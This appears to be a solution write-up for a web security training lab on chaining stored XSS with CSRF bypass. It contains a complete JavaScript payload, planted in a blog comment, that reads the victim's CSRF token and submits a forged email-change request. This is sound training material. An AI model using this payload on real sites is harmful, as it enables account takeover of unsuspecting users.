# Lab 6: Exploiting XSS to bypass CSRF defenses

Exploit stored XSS to extract a victim’s CSRF token and change their email address when they view your comment.

---

## 🔐 Credentials

- **Username:** `wiener`
- **Password:** `peter`

---

## 💡 Hint

- You cannot register an email address already in use.
- When testing, use **unique email addresses** before final deployment to the victim.

---

## 🧪 Lab Solution Steps

### 1️⃣ Log In and Inspect Email Change Functionality

- Log into your account using the credentials above.
- Navigate to the **"My Account"** page.
- View the source of the page — you will discover:
    - 📥 A POST request to `/my-account/change-email`
    - 🔑 A hidden CSRF token input:
        
        ```html
        <input type="hidden" name="csrf" value="...">
        
        ```
        

---

### 2️⃣ Craft the Stored XSS Payload

- Submit this payload in a **blog comment** field:

```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();

function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&email=test@test.com');
};
</script>

```

### 🧠 What It Does:

- Makes a **GET** request to `/my-account`
- Extracts the CSRF token from the response
- Uses the token to **submit a forged POST** request to update the victim's email address

---

## ✅ Goal

When a **victim user** views the comment:

- Their browser executes your payload
- Their **email gets changed** to `test@test.com`
- 🎉 The lab is solved

---

## 🎥 Community Solution

> 📺 Watch on YouTube: 
[https://youtu.be/DWThhRPwGEg](https://youtu.be/DWThhRPwGEg)
>